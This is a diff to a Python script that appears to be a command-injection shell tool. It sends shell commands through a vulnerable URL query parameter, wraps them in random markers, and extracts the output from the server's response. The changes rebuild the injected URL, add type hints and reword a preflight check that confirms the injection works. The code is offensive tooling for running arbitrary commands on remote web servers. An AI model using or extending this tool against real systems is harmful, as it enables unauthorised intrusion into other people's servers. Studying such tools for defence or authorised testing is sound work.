@@ -3,13 +3,14 @@ import string
 import argparse
 from html import unescape
 import urllib.parse
+from urllib.parse import urlsplit, urlunsplit, parse_qsl, urlencode
 
 import requests
 
 
 # Configuration
-address = None
-parameter = None
+address : str
+parameter : str
 url_encode = True
 verbose = False
 cookies = None
@@ -35,6 +36,13 @@ def extract_markers(response_text, start_marker, end_marker):
         return None
     
     return response_text[start_index + len(start_marker):end_index].strip()
+
+def set_query_param(address: str, key: str, value: str) -> str:
+    parts = urlsplit(address)
+    query = dict(parse_qsl(parts.query, keep_blank_values=True))
+    query[key] = value
+    new_query = urlencode(query)
+    return urlunsplit((parts.scheme, parts.netloc, parts.path, new_query, parts.fragment))
     
 def send_command(command):
     start_marker = f"--{random_string(8)}--"
@@ -49,7 +57,10 @@ def send_command(command):
     if url_encode:
         wrapped_command = urllib.parse.quote(wrapped_command)
     
-    url = f"{address}?{parameter}={wrapped_command}"
+    # Insert a placeholder in the URL and replace it with the wrapped command to ensure proper encoding and avoid issues with special characters in the command
+    url = set_query_param(address, parameter, '--NETSHELL_PLACEHOLDER--')
+    url = url.replace('--NETSHELL_PLACEHOLDER--', wrapped_command)
+    
     voutput(f"Sent command: {url}")
     response = requests.get(url, cookies=cookies, headers={'User-Agent': user_agent} if user_agent else None)
     voutput(f"Status code: {response.status_code}")
@@ -69,7 +80,7 @@ def preflight_request():
     
     response = send_command(preflight_echo)
     if not response:
-        print("[!] Preflight request failed: No response received.")
+        print("[!] Preflight request failed: No echo response received meaning the injection might not work properly.")
         return False
     if preflight_random not in response:
         print("[!] Preflight request failed: Could not verify command output.")
